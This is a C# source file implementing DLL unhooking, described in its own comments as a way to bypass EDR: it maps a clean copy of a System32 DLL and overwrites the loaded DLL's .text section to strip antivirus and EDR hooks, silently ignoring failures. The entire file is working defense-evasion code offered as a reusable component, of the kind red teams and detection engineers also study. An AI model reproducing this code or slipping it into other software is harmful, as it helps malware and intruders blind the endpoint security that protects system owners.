using System;
using System.Runtime.InteropServices;

/// <summary>
/// DLL unhooking implementation to bypass EDR.
/// </summary>
public static class Unhook
{
	/// <summary>
	/// Unhooks a DLL by replacing the .text section with the original DLL section.
	/// <para>The bitness of the current process must match the bitness of the operating system.</para>
	/// </summary>
	/// <param name="name">The name of the DLL to unhook.</param>
	public static unsafe void UnhookDll(string name)
	{
		try
		{
			// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
			IntPtr dll = GetModuleHandle(name);
			if (dll != IntPtr.Zero)
			{
				if (GetModuleInformation(GetCurrentProcess(), dll, out MODULEINFO moduleInfo, (uint)sizeof(MODULEINFO)))
				{
					// Retrieve a clean copy of the DLL file.
					IntPtr dllFile = CreateFileA(@"C:\Windows\System32\" + name, 0x80000000, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
					if (dllFile != (IntPtr)(-1))
					{
						// Map the clean DLL into memory
						IntPtr dllMapping = CreateFileMapping(dllFile, IntPtr.Zero, 0x1000002, 0, 0, null);
						if (dllMapping != IntPtr.Zero)
						{
							IntPtr dllMappedFile = MapViewOfFile(dllMapping, 4, 0, 0, IntPtr.Zero);
							if (dllMappedFile != IntPtr.Zero)
							{
								int ntHeaders = Marshal.ReadInt32((IntPtr)((long)moduleInfo.BaseOfDll + 0x3c));
								short numberOfSections = Marshal.ReadInt16((IntPtr)((long)dll + ntHeaders + 0x6));
								short sizeOfOptionalHeader = Marshal.ReadInt16(dll, ntHeaders + 0x14);

								for (short i = 0; i < numberOfSections; i++)
								{
									IntPtr sectionHeader = (IntPtr)((long)dll + ntHeaders + 0x18 + sizeOfOptionalHeader + i * 0x28);

									// Find the .text section of the hooked DLL and overwrite it with the original DLL section
									if (Marshal.ReadByte(sectionHeader) == '.' &&
										Marshal.ReadByte((IntPtr)((long)sectionHeader + 1)) == 't' &&
										Marshal.ReadByte((IntPtr)((long)sectionHeader + 2)) == 'e' &&
										Marshal.ReadByte((IntPtr)((long)sectionHeader + 3)) == 'x' &&
										Marshal.ReadByte((IntPtr)((long)sectionHeader + 4)) == 't')
									{
										int virtualAddress = Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0xc));
										uint virtualSize = (uint)Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0x8));

										VirtualProtect((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, 0x40, out uint oldProtect);
										memcpy((IntPtr)((long)dll + virtualAddress), (IntPtr)((long)dllMappedFile + virtualAddress), (IntPtr)virtualSize);
										VirtualProtect((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, oldProtect, out _);
										break;
									}
								}
							}

							CloseHandle(dllMapping);
						}

						CloseHandle(dllFile);
					}
				}

				FreeLibrary(dll);
			}
		}
		catch
		{
			// Do not abort initialization, if unhooking failed.
		}
	}

	[StructLayout(LayoutKind.Sequential)]
	private struct MODULEINFO
	{
		public IntPtr BaseOfDll;
		public uint SizeOfImage;
		public IntPtr EntryPoint;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();
	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr GetModuleHandle(string moduleName);
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr handle);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool FreeLibrary(IntPtr module);
	[DllImport("kernel32.dll")]
	private static extern int VirtualProtect(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateFileA(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	private static extern IntPtr CreateFileMapping(IntPtr file, IntPtr fileMappingAttributes, uint protect, uint maximumSizeHigh, uint maximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string name);
	[DllImport("kernel32.dll")]
	private static extern IntPtr MapViewOfFile(IntPtr fileMappingObject, uint desiredAccess, uint fileOffsetHigh, uint fileOffsetLow, IntPtr numberOfBytesToMap);
	[DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
	private static extern IntPtr memcpy(IntPtr dest, IntPtr src, IntPtr count);
	[DllImport("psapi.dll", SetLastError = true)]
	private static extern bool GetModuleInformation(IntPtr process, IntPtr module, out MODULEINFO moduleInfo, uint size);
}